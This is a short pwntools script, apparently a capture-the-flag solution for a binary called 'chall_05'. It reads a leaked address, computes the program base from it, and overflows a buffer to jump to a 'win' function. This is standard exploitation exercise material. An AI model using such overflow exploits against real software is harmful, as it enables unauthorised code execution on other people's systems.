# coding: utf-8
from pwn import *
def exploit():
    elf= ELF("./chall_05")
    proc= process("./chall_05")
    proc.recvuntil(":")
    overflow= proc.recv()
    of= int(overflow, 16)
    elf.address= of-elf.sym.main
    p= (b'a'*(0x60-8)+ p64(elf.sym.win))
    proc.sendline(p)
    proc.interactive()
    proc.close()
    
exploit()
